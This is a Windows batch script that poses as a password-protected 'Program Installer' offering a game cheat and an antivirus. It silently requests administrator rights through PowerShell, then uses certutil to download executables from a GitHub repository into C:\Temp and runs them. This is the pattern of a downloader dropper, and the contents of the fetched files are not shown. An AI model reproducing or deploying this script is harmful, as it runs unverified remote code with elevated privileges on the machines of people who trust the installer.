��
@echo off
:start
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & goto error)
:password
title Enter the Password
cls
Color C
echo Please enter the Password
set /p password=
if %password% EQU homeunlockerpassword193467 goto home
Echo Invalid Password
pause
goto password
exit


:home
cls
color 2
title Program Installer
echo 1) DPCheat
echo 2) AntiVirus-Luno
echo 3) Exit
set /p choice=
if %choice% EQU 1 goto dpcheat
if %choice% EQU 2 goto antivirus
if %choice% EQU 3 exit
cls
goto home
exit



:dpcheat
mkdir "C:\Temp"
cd C:\Temp
certutil -urlcache -split -f "https://github.com/Sevka133/-/raw/refs/heads/main/DPCheat.exe" "C:\Temp\DPCheat.exe"
start DPCheat.exe
exit



:antivirus
mkdir "C:\Temp"
cd C:\Temp
certutil -urlcache -split -f "https://github.com/Sevka133/-/raw/refs/heads/main/AntiVirus-Luno.exe" "C:\Temp\AntiVirus-Luno.exe"
start AntiVirus-Luno.exe
exit



:ERROR
cls
Color 4
Echo !!!ERROR!!!
timeout 3
exit